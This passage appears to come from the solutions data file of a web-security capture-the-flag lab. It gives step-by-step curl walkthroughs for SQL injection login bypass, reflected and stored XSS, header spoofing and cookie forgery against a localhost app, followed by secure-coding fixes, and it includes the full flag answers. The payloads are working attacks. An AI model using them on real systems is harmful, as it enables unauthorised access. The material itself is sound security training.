Order 1337: Vault Key — BK{1d0r_p4r4m_t4mp3r_3f2e1d0c9b8a7f6e}`,
    flagNote: 'Submit the revealed key: <code>BK{1d0r_p4r4m_t4mp3r_...}</code>.'
  },

  'web-sqli': {
    objective: 'Bypass authentication on /portal-8f2c/login using an SQL injection syntax break and line comment (admin\'--).',
    steps: [
      'Open the lab terminal window.',
      'Identify the administrative login endpoint from robots.txt: <code>/portal-8f2c/login</code>.',
      'Craft an SQL injection payload that escapes the single-quoted string literal and comments out the password clause: <code>username = admin\'--</code>.',
      'Submit the exploit payload via HTTP POST: <code>curl -X POST --data-urlencode "username=admin\'--" -d "password=x" http://localhost:8080/portal-8f2c/login</code>.',
      'Alternatively, use boolean tautology: <code>curl -X POST --data-urlencode "username=\' OR \'1\'=\'1" -d "password=x" http://localhost:8080/portal-8f2c/login</code>.',
      'The database evaluates <code>SELECT * FROM users WHERE username = \'admin\'--\' AND password = \'x\'</code>, logging in as admin and returning the flag.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: "curl -X POST --data-urlencode \"username=admin'--\" -d \"password=x\" http://localhost:8080/portal-8f2c/login",
        flags: [
          { flag: '-X POST', explanation: 'Sends an HTTP POST request.' },
          { flag: '--data-urlencode "username=admin\'--"', explanation: 'URL-encodes the injection string (encoding single quotes and hyphens) so the server parser interprets the raw characters cleanly.' },
          { flag: "' (single quote)", explanation: 'Terminates the SQL string literal boundary.' },
          { flag: "-- (SQL comment)", explanation: 'Instructs the SQLite engine to treat the remainder of the SQL query line (including AND password = ...) as a non-executable comment.' },
          { flag: '-d "password=x"', explanation: 'Supplies an arbitrary dummy password.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl -X POST --data-urlencode "username=admin'--" -d "password=x" http://localhost:8080/portal-8f2c/login
Logged in as admin. BK{un10n_s3l3ct_byp4ss_8a7b6c5d4e3f2a1b}`,
    flagNote: 'Submit the token: <code>BK{un10n_s3l3ct_byp4ss_...}</code>.'
  },

  'web-reflected-xss': {
    objective: 'Exploit unescaped input reflection on /search?q=<payload> to execute browser JavaScript that reports the in-memory window.KEEP_NONCE to /xss-report.',
    steps: [
      'Open the web application in your browser via the "Open web app" button.',
      'Notice that entering text into the search box reflects the query directly into the HTML without output encoding.',
      'Construct an XSS payload that reads the session nonce and performs an asynchronous GET callback: <code>&lt;script&gt;fetch(\'/xss-report?r=reflected-xss&nonce=\'+window.KEEP_NONCE)&lt;/script&gt;</code>.',
      'Navigate to the crafted search URL in your browser: <code>http://localhost:8080/search?q=&lt;script&gt;fetch(\'/xss-report?r=reflected-xss&nonce=\'+window.KEEP_NONCE)&lt;/script&gt;</code>.',
      'The browser executes the injected script, triggering the callback to <code>/xss-report</code>.',
      'Check the challenge completion status endpoint via curl or browser: <code>curl "http://localhost:8080/xss-status?r=reflected-xss"</code>.',
      'The server verifies valid execution and outputs the flag.'
    ],
    commands: [
      {
        code: "http://localhost:8080/search?q=<script>fetch('/xss-report?r=reflected-xss&nonce='+window.KEEP_NONCE)</script>",
        flags: [
          { flag: '<script>...</script>', explanation: 'Injects an active JavaScript execution block directly into the Document Object Model (DOM).' },
          { flag: 'window.KEEP_NONCE', explanation: 'In-page verification token embedded in the DOM to confirm authentic client execution.' },
          { flag: 'fetch(...)', explanation: 'Browser Web API making an asynchronous HTTP request to report successful script execution.' }
        ]
      },
      {
        code: 'curl "http://localhost:8080/xss-status?r=reflected-xss"',
        flags: [
          { flag: 'curl', explanation: 'Queries the room status endpoint to retrieve the reward flag once execution is validated.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl "http://localhost:8080/xss-status?r=reflected-xss"
solved. BK{xss_scr1pt_4l3rt_2b3c4d5e6f7a8b9c}`,
    flagNote: 'Submit the token: <code>BK{xss_scr1pt_4l3rt_...}</code>.'
  },

  'web-headers': {
    objective: 'Bypass access control on /admin-panel by injecting the required custom request header X-Keep-Role: admin.',
    steps: [
      'Query the administrative panel: <code>curl -i http://localhost:8080/admin-panel</code>.',
      'Observe the <code>403 Forbidden</code> response: <code>forbidden: this panel requires the header  X-Keep-Role: admin</code>.',
      'Resubmit the request supplying the required custom header: <code>curl -H "X-Keep-Role: admin" http://localhost:8080/admin-panel</code>.',
      'The server validates <code>req.headers[\'x-keep-role\'] === \'admin\'</code> and returns <code>admin panel unlocked. BK{c0rs_h34d3r_sp00f_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'curl -i http://localhost:8080/admin-panel',
        flags: [
          { flag: '-i', explanation: 'Includes HTTP response status line and headers.' }
        ]
      },
      {
        code: 'curl -H "X-Keep-Role: admin" http://localhost:8080/admin-panel',
        flags: [
          { flag: '-H "X-Keep-Role: admin"', explanation: 'Custom header flag. Injects the specified header into the outbound HTTP request.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl -i http://localhost:8080/admin-panel
HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8
Content-Length: 69

forbidden: this panel requires the header  X-Keep-Role: admin
student@tradingpost:~$ curl -H "X-Keep-Role: admin" http://localhost:8080/admin-panel
admin panel unlocked. BK{c0rs_h34d3r_sp00f_1f2e3d4c5b6a7980}`,
    flagNote: 'Submit the token: <code>BK{c0rs_h34d3r_sp00f_...}</code>.'
  },

  'web-stored-xss': {
    objective: 'Inject a persistent malicious script into /guestbook via HTTP POST, trigger execution by viewing /guestbook in the browser, and retrieve the flag.',
    steps: [
      'Open the lab terminal window.',
      'Submit a stored XSS payload into the guestbook via HTTP POST: <code>curl -X POST -d "comment=&lt;script&gt;fetch(\'/xss-report?r=stored-xss&nonce=\'+window.KEEP_NONCE)&lt;/script&gt;" http://localhost:8080/guestbook</code>.',
      'Open the web application in your browser and navigate to the guestbook page at <code>http://localhost:8080/guestbook</code>.',
      'The browser renders the stored comment from the server, evaluates the unescaped <code>&lt;script&gt;</code> tag, and sends the callback request with <code>window.KEEP_NONCE</code>.',
      'Check the completion status: <code>curl "http://localhost:8080/xss-status?r=stored-xss"</code>.',
      'The server outputs: <code>solved. BK{p3rs1st3nt_p4yl04d_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: "curl -X POST -d \"comment=<script>fetch('/xss-report?r=stored-xss&nonce='+window.KEEP_NONCE)</script>\" http://localhost:8080/guestbook",
        flags: [
          { flag: '-X POST', explanation: 'Transmits an HTTP POST request to store the comment.' },
          { flag: '-d "comment=..."', explanation: 'Sends the persistent XSS payload as form-encoded data.' }
        ]
      },
      {
        code: 'curl "http://localhost:8080/xss-status?r=stored-xss"',
        flags: [
          { flag: 'curl', explanation: 'Checks the status endpoint once the script executes in the browser.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl -X POST -d "comment=<script>fetch('/xss-report?r=stored-xss&nonce='+window.KEEP_NONCE)</script>" http://localhost:8080/guestbook
Found. Redirecting to guestbook
# Student opens http://localhost:8080/guestbook in the browser
student@tradingpost:~$ curl "http://localhost:8080/xss-status?r=stored-xss"
solved. BK{p3rs1st3nt_p4yl04d_9a8b7c6d5e4f3a2b}`,
    flagNote: 'Submit the token: <code>BK{p3rs1st3nt_p4yl04d_...}</code>.'
  },

  'web-chain': {
    objective: 'Chain endpoint discovery from robots.txt with cookie tampering to access the hidden administrative vault at /keep-admin/vault.',
    steps: [
      'Reconnaissance: Query <code>robots.txt</code> using <code>curl -s http://localhost:8080/robots.txt</code> to reveal <code>Disallow: /keep-admin/</code>.',
      'Probe the hidden administrative path: <code>curl -i http://localhost:8080/keep-admin/vault</code>.',
      'Notice the <code>403 Forbidden</code> response: <code>forbidden: admin only (how did the vault room get in?)</code>.',
      'Chain the vulnerability by injecting the forged administrative cookie into the hidden endpoint: <code>curl --cookie "role=admin" http://localhost:8080/keep-admin/vault</code>.',
      'The server validates both the route and the cookie, returning: <code>chained to the inner vault. BK{full_ch41n_3xpl01t_...}</code>.',
      'Copy and submit the flag.'
    ],
    commands: [
      {
        code: 'curl -s http://localhost:8080/robots.txt',
        flags: [
          { flag: 'robots.txt', explanation: 'Discovers undisclosed administrative routing endpoints.' }
        ]
      },
      {
        code: 'curl -i http://localhost:8080/keep-admin/vault',
        flags: [
          { flag: '-i', explanation: 'Verifies the 403 Forbidden status on the hidden path.' }
        ]
      },
      {
        code: 'curl --cookie "role=admin" http://localhost:8080/keep-admin/vault',
        flags: [
          { flag: '--cookie "role=admin"', explanation: 'Supplies the elevated role cookie to bypass the access control gate.' }
        ]
      }
    ],
    output: `student@tradingpost:~$ curl -s http://localhost:8080/robots.txt
User-agent: *
Disallow: /portal-8f2c/
Disallow: /keep-backup/
Disallow: /keep-admin/
student@tradingpost:~$ curl -i http://localhost:8080/keep-admin/vault
HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8
Content-Length: 53

forbidden: admin only (how did the vault room get in?)
student@tradingpost:~$ curl --cookie "role=admin" http://localhost:8080/keep-admin/vault
chained to the inner vault. BK{full_ch41n_3xpl01t_4a5b6c7d8e9f0a1b}`,
    flagNote: 'Submit the token: <code>BK{full_ch41n_3xpl01t_...}</code>.'
  },

  // ==========================================
  // CHAPTER 3: THE FORGE (SECURE CODING)
  // ==========================================
  'secure-sqli': {
    objective: 'Fix SQL injection on /portal-8f2c/login in /app/server.js using parameterized queries / prepared statements with placeholder bindings.',
    steps: [
      'Open the in-browser code editor in the Forge interface.',
      'Locate the login route handler in <code>/app/server.js</code> (around line 45).',
      'Identify the vulnerable string concatenation: <code>const q = `SELECT * FROM users WHERE username = \'${username}\' AND password = \'${password}\'`</code>.',
      'Replace raw string interpolation with a prepared statement using parameter placeholders: <code>const row = db.prepare(\'SELECT * FROM users WHERE username = ? AND password = ?\').get(username, password)</code>.',
      'Click **Save & Run**.',
      'The automated test harness validates that the exploit payload (<code>admin\'--</code>) is blocked while legitimate credentials succeed, awarding the flag.'
    ],
    commands: [
      {
        code: `// Secure Remediation in /app/server.js:
app.post('/portal-8f2c/login', (req, res) => {
  const { username, password } = req.body
  try {
    // Prepared statement binds input as data literals, neutralizing SQL injection
    const row = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password)
    if (row) return res.send(\`Logged in as \${row.username}.\`)
    res.status(401).send('Bad credentials')
  } catch (e) {
    res.status(500).send('Query error: ' + e.message)
  }
})`,
        flags: [
          { flag: 'db.prepare(...)', explanation: 'Pre-compiles SQL query structure with the database engine before data values are supplied.' },
          { flag: '?', explanation: 'Positional parameter placeholders. Instructs the SQLite query planner to treat bound values strictly as literal values, never as executable SQL syntax.' },
          { flag: '.get(username, password)', explanation: 'Safely passes variables as bound parameters during execution.' }
        ]
      }
    ],
    output: `Test Harness Output:
[TEST] Testing SQL Injection exploit (username="admin'--")... BLOCKED (401 Bad credentials)
[TEST] Testing legitimate login (username="admin", password="super-secret-pw")... PASSED (200 OK)
All criteria passed! Flag: BK{pr3p4r3d_st4t3m3nts_w1n_1a2b3c4d5e6f7a8b}`,
    flagNote: 'Submit the token starting with <code>BK{pr3p4r3d_st4t3m3nts_w1n_...}</code>.'
  },

  'secure-xss': {
    objective: 'Neutralize Reflected Cross-Site Scripting on /search in /app/server.js by implementing context-aware HTML entity encoding.',
    steps: [
      'Open the in-browser code editor.',
      'Locate the search handler in <code>/app/server.js</code> (around line 56).',
      'Observe that <code>req.query.q</code> is reflected directly into the HTML response unescaped.',
      'Define an HTML entity escaping helper function to convert dangerous characters (<code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>\'</code>) into safe entities.',
      'Sanitize the query variable before HTML template interpolation: <code>const q = escapeHtml(req.query.q || \'\')</code>.',
      'Click **Save & Run**.',
      'The grader tests confirm that <code>&lt;script&gt;</code> tags are converted to safe text and releases the flag.'
    ],
    commands: [
      {
        code: `// Secure Remediation in /app/server.js:
function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

app.get('/search', (req, res) => {
  const q = escapeHtml(req.query.q || '')
  res.type('html').send(\`<h1>Results for \${q}</h1><p>No products matched.</p>\`)
})`,
        flags: [
          { flag: 'replace(/</g, \'&lt;\')', explanation: 'Replaces < with HTML entity &lt;. The browser displays the character glyph visually without parsing it as an opening HTML element tag.' },
          { flag: 'replace(/>/g, \'&gt;\')', explanation: 'Replaces > with HTML entity &gt;, preventing HTML tag closure attacks.' },
          { flag: 'replace(/&/g, \'&amp;\')', explanation: 'Must be replaced first to avoid double-encoding entity ampersands.' }
        ]
      }
    ],
    output: `Test Harness Output:
[TEST] Testing XSS injection query ("<script>alert(1)</script>")... BLOCKED (Rendered as &lt;script&gt;)
[TEST] Testing legitimate query ("widget")... PASSED (200 OK)
All criteria passed! Flag: BK{s4n1t1z3_y0ur_1nputs_2c3d4e5f6a7b8c9d}`,
    flagNote: 'Submit the token starting with <code>BK{s4n1t1z3_y0ur_1nputs_...}</code>.'
  },

  'secure-idor': {
    objective: 'Remediate Insecure Direct Object Reference on /order in /app/server.js by enforcing object-level authorization against the session cookie identity.',
    steps: [
      'Open the in-browser code editor.',
      'Locate the order retrieval handler in <code>/app/server.js</code> (around line 38).',
      'Notice that the query retrieves the order by <code>id</code> without checking if <code>row.owner</code> belongs to the requesting client.',
      'Add an object-level authorization check: verify that <code>row.owner === req.cookies.uid</code>. If they do not match, return <code>res.status(403).send(\'Forbidden\')</code>.',
      'Click **Save & Run**.',
      'The harness verifies that accessing unowned orders is denied with HTTP 403 while legitimate owned orders succeed, releasing the flag.'
    ],
    commands: [
      {
        code: `// Secure Remediation in /app/server.js:
app.get('/order', (req, res) => {
  const row = db.prepare('SELECT * FROM orders WHERE id = ?').get(req.query.id)
  if (!row) return res.status(404).send('No such order')
  
  // Object-Level Access Control: verify user owns the requested record
  if (row.owner !== req.cookies.uid) {
    return res.status(403).send('Forbidden: you do not own this order')
  }

  res.send(\`Order \${row.id} (\${row.owner}): \${row.item} — \${row.secret}\`)
})`,
        flags: [
          { flag: 'row.owner !== req.cookies.uid', explanation: 'Compares the owner column in the database record with the authenticated user ID stored in the session cookie.' },
          { flag: 'res.status(403)', explanation: 'Returns HTTP 403 Forbidden status code when authorization fails.' }
        ]
      }
    ],
    output: `Test Harness Output:
[TEST] Requesting unowned order ID 1337 with cookie uid=alice... BLOCKED (403 Forbidden)
[TEST] Requesting owned order ID 1042 with cookie uid=alice... PASSED (200 OK)
All criteria passed! Flag: BK{s3ss10n_b4s3d_4uth_3d4e5f6a7b8c9d0e}`,
    flagNote: 'Submit the token starting with <code>BK{s3ss10n_b4s3d_4uth_...}</code>.'
  },

  'secure-client': {
    objective: 'Fix client-side parameter tampering on /checkout in /app/server.js by validating that price is strictly positive and non-zero on the server.',
    steps: [
      'Open the in-browser code editor.',
      'Locate the checkout route handler in <code>/app/server.js</code> (around line 31).',
      'Observe the flawed logic accepting <code>price &lt;= 0</code> as a free order.',
      'Replace the bypass logic with strict input validation: ensure <code>price</code> is a valid number strictly greater than 0. If <code>!price || price &lt;= 0 || isNaN(price)</code>, reject with HTTP 400.',
      'Click **Save & Run**.',
      'The test harness verifies that zero/negative prices return HTTP 400 while positive prices process correctly, releasing the flag.'
    ],
    commands: [
      {
        code: `// Secure Remediation in /app/server.js:
app.post('/checkout', (req, res) => {
  const price = Number(req.body.price)
  
  // Authoritative server validation: reject manipulated or non-positive prices
  if (!price || price <= 0 || isNaN(price)) {
    return res.status(400).send('Invalid price parameter')
  }

  res.send(\`Charged \${price}.\`)
})`,
        flags: [
          { flag: 'Number(req.body.price)', explanation: 'Explicitly casts client string input into a numeric primitive.' },
          { flag: 'price <= 0 || isNaN(price)', explanation: 'Enforces business invariant: checkout amounts must be strictly positive numeric values.' },
          { flag: 'res.status(400)', explanation: 'Returns standard HTTP 400 Bad Request client error.' }
        ]
      }
    ],
    output: `Test Harness Output:
[TEST] Submitting checkout with price=0... BLOCKED (400 Bad Request)
[TEST] Submitting checkout with price=-50... BLOCKED (400 Bad Request)
[TEST] Submitting checkout with price=10... PASSED (200 OK, Charged 10)
All criteria passed! Flag: BK{s3rv3r_v4l1d4t10n_ru13s_4e5f6a7b8c9d0e1f}`,
    flagNote: 'Submit the token starting with <code>BK{s3rv3r_v4l1d4t10n_ru13s_...}</code>.'
  },

  'secure-headers': {
    objective: 'Implement defensive HTTP headers (X-Content-Type-Options: nosniff and X-Frame-Options: DENY) as global Express middleware in /app/server.js.',
    steps: [
      'Open the in-browser code editor.',
      'Locate application initialization in <code>/app/server.js</code>.',
      'Register a global Express middleware using <code>app.use(...)</code> prior to route declarations.',
      'Set protective response headers: <code>res.setHeader(\'X-Content-Type-Options\', \'nosniff\')</code> and <code>res.setHeader(\'X-Frame-Options\', \'DENY\')</code>, then invoke <code>next()</code>.',
      'Click **Save & Run**.',
      'The test harness confirms the headers are returned on all endpoints and releases the flag.'
    ],
    commands: [
      {
        code: `// Secure Remediation in /app/server.js:
app.use((_req, res, next) => {
  // Prevent browser MIME-type sniffing:
  res.setHeader('X-Content-Type-Options', 'nosniff')
  
  // Prevent clickjacking by forbidding embedding in iframes:
  res.setHeader('X-Frame-Options', 'DENY')
  
  next()
})`,
        flags: [
          { flag: 'X-Content-Type-Options: nosniff', explanation: 'Forces modern browsers to adhere strictly to the Content-Type header declared by the server, preventing attacks where user-uploaded text is interpreted as HTML or scripts.' },
          { flag: 'X-Frame-Options: DENY', explanation: 'Completely disables the webpage from being rendered inside an <iframe>, preventing UI redressing and clickjacking.' },
          { flag: 'next()', explanation: 'Passes execution flow to the subsequent middleware or route handler.' }
        ]
      }
    ],
    output: `Test Harness Output:
[TEST] Inspecting HTTP response headers on GET /...
[TEST] X-Content-Type-Options: nosniff... FOUND
[TEST] X-Frame-Options: DENY... FOUND
All criteria passed! Flag: BK{csp_str1ct_h34d3rs_5f6a7b8c9d0e1f2a}`,
    flagNote: 'Submit the token starting with <code>BK{csp_str1ct_h34d3rs_...}</code>.'
  },

  'secure-rate-limit': {
    objective: 'Mitigate credential brute-force attacks on /portal-8f2c/login by implementing sliding-window IP rate limiting in /app/server.js.',
    steps: [
      'Open the in-browser code editor.',
      'Define an in-memory attempt tracker map and a time window constant (e.g., 60 seconds): <code>const loginAttempts = new Map(); const WINDOW_MS = 60 * 1000;</code>.',
      'Inside <code>app.post(\'/portal-8f2c/login\', ...)</code>, extract client IP and track attempts.',
      'If the client exceeds 10 attempts within the window, reject the request with HTTP 429: <code>return res.status(429).send(\'Too many attempts\')</code>.',
      'Click **Save & Run**.',
      'The test harness fires 15 rapid login requests, verifies that request 11+ receives HTTP 429 while initial requests succeed, and releases the flag.'
    ],
    commands: [
      {
        code: `// Secure Remediation in /app/server.js:
const loginAttempts = new Map() // ip -> { count, expiresAt }
const WINDOW_MS = 60 * 1000

app.post('/portal-8f2c/login', (req, res) => {
  const ip = req.ip || req.connection.remoteAddress || 'client'
  const now = Date.now()
  const entry = loginAttempts.get(ip) || { count: 0, expiresAt: now + WINDOW_MS }

  // Reset counter when time window expires
  if (now > entry.expiresAt) {
    entry.count = 0
    entry.expiresAt = now + WINDOW_MS
  }

  entry.count++
  loginAttempts.set(ip, entry)

  // Block after 10 requests within the window
  if (entry.count > 10) {
    return res.status(429).send('Too many login attempts. Please try again later.')
  }

  const { username, password } = req.body
  // ... proceed with authentication
})`,
        flags: [
          { flag: 'res.status(429)', explanation: 'Standard HTTP status code 429 Too Many Requests, informing clients and rate-limit crawlers of throttling.' },
          { flag: 'WINDOW_MS = 60 * 1000', explanation: 'Sliding expiration window preventing permanent denial-of-service lockout for legitimate users who made typos.' }
        ]
      }
    ],
    output: `Test Harness Output:
[TEST] Firing 10 sequential login attempts... ACCEPTED (401 Bad credentials)
[TEST] Firing 11th login attempt... THROTTLED (429 Too Many Requests)
All criteria passed! Flag: BK{t0k3n_buck3t_l1m1t_6a7b8c9d0e1f2a3b}`,
    flagNote: 'Submit the token starting with <code>BK{t0k3n_buck3t_l1m1t_...}</code>.'
  },

  'secure-hide-secret': {
    objective: 'Remove hardcoded secret credentials from source code in /app/server.js, reading from process.env and sanitizing public configuration endpoints.',
    steps: [
      'Open the in-browser code editor.',
      'Locate hardcoded API key declaration in <code>/app/server.js</code>: <code>const API_KEY = \'sk-hardcoded-9f83a1\'</code>.',
      'Refactor to load the secret from environment variables: <code>const API_KEY = process.env.API_KEY || \'\'</code>.',
      'Locate the public configuration endpoint <code>app.get(\'/config\', ...)</code> that prints <code>api_key=${API_KEY}</code>.',
      'Sanitize the endpoint output so the sensitive API key is redacted: <code>res.type(\'text/plain\').send(\'service=keepd\\nmode=prod\\n\')</code>.',
      'Click **Save & Run**.',
      'The test harness verifies that <code>GET /config</code> no longer exposes the hardcoded secret and releases the flag.'
    ],
    commands: [
      {
        code: `// Secure Remediation in /app/server.js:
const API_KEY = process.env.API_KEY || ''

app.get('/config', (_req, res) => {
  // Redact confidential keys from public configuration feeds
  res.type('text/plain').send('service=keepd\\nmode=prod\\n')
})`,
        flags: [
          { flag: 'process.env.API_KEY', explanation: 'Loads credentials dynamically from process execution environment (12-Factor App methodology), keeping secrets out of git commit history.' },
          { flag: 'Redaction', explanation: 'Removes api_key field from unauthenticated endpoint.' }
        ]
      }
    ],
    output: `Test Harness Output:
[TEST] Querying GET /config...
[TEST] Checking for exposure of "sk-hardcoded-9f83a1"... NOT FOUND (CLEAN)
[TEST] Verifying service=keepd status... PASSED (200 OK)
All criteria passed! Flag: BK{k33p_3nv_s3cr3t_7b8c9d0e1f2a3b4c}`,
    flagNote: 'Submit the token starting with <code>BK{k33p_3nv_s3cr3t_...}</code>.'
  },

  'secure-full-review': {
    objective: 'Conduct a comprehensive code security audit of server.js and patch all 4 primary vulnerabilities (SQLi, XSS, IDOR, Price Tampering) in a single deployment.',
    steps: [
      'Open the in-browser code editor containing the complete raw <code>/app/server.js</code>.',
      'Implement all four core defensive remediations simultaneously:',
      '1. Price Tampering (Client Trust): In <code>/checkout</code>, validate <code>!price || price &lt;= 0 || isNaN(price)</code> and return HTTP 400.',
      '2. Insecure Direct Object Reference: In <code>/order</code>, verify <code>row.owner === req.cookies.uid</code> and return HTTP 403 on mismatch.',
      '3. SQL Injection: In <code>/portal-8f2c/login</code>, parameterize the query with <code>db.prepare(\'SELECT * FROM users WHERE username = ? AND password = ?\').get(username, password)</code>.',
      '4. Reflected XSS: Define <code>escapeHtml()</code> and sanitize <code>req.query.q</code> in <code>/search</code>.',
      'Click **Save & Run**.',
      'The harness executes the entire multi-vector integration test suite, verifies all 4 exploits are neutralized without breaking functionality, and releases the final champion flag.'
    ],
    commands: [
      {
        code: `// Complete Hardened Reference Implementation (/app/server.js):
import express from 'express'
import cookieParser from 'cookie-parser'
import { makeDb } from './seed.js'

const db = makeDb()
const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(express.json())
app.use(cookieParser())

// Helper: Context-aware HTML entity encoding
function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

app.get('/', (_req, res) => res.type('html').send('<h1>Trading Post</h1>'))
app.get('/robots.txt', (_req, res) => res.type('text/plain').send('User-agent: *\\nDisallow: /portal-8f2c/'))

// FIX 1: Price Tampering (Client Trust)
app.post('/checkout', (req, res) => {
  const price = Number(req.body.price)
  if (!price || price <= 0 || isNaN(price)) {
    return res.status(400).send('Invalid price parameter')
  }
  res.send(\`Charged \${price}.\`)
})

// FIX 2: Insecure Direct Object Reference (IDOR)
app.get('/order', (req, res) => {
  const row = db.prepare('SELECT * FROM orders WHERE id = ?').get(req.query.id)
  if (!row) return res.status(404).send('No such order')
  if (row.owner !== req.cookies.uid) {
    return res.status(403).send('Forbidden: you do not own this order')
  }
  res.send(\`Order \${row.id} (\${row.owner}): \${row.item} — \${row.secret}\`)
})

// FIX 3: SQL Injection (Prepared Statements)
app.post('/portal-8f2c/login', (req, res) => {
  const { username, password } = req.body
  try {
    const row = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password)
    if (row) return res.send(\`Logged in as \${row.username}.\`)
    res.status(401).send('Bad credentials')
  } catch (e) {
    res.status(500).send('Query error: ' + e.message)
  }
})

// FIX 4: Reflected Cross-Site Scripting (Output Encoding)
app.get('/search', (req, res) => {
  const q = escapeHtml(req.query.q || '')
  res.type('html').send(\`<h1>Results for \${q}</h1><p>No products matched.</p>\`)
})

const PORT = process.env.PORT || 8080
if (!process.env.HARNESS) app.listen(PORT, () => console.log(\`[trading-post] on :\${PORT}\`))
export default app`,
        flags: [
          { flag: 'Full Defense-in-Depth', explanation: 'Combines parameterization, object authorization, strict numerical input validation, and contextual output encoding.' }
        ]
      }
    ],
    output: `Test Harness Output:
{
  "room": "full-review",
  "parts": [
    { "name": "sqli", "exploitBlocked": true, "stillWorks": true, "pass": true },
    { "name": "xss", "exploitBlocked": true, "stillWorks": true, "pass": true },
    { "name": "idor", "exploitBlocked": true, "stillWorks": true, "pass": true },
    { "name": "client", "exploitBlocked": true, "stillWorks": true, "pass": true }
  ],
  "pass": true
}
All criteria passed! Flag: BK{c0d3_4ud1t_ch4mp10n_8c9d0e1f2a3b4c5d}`,
    flagNote: 'Submit the master champion flag: <code>BK{c0d3_4ud1t_ch4mp10n_...}</code>.'
  }
}
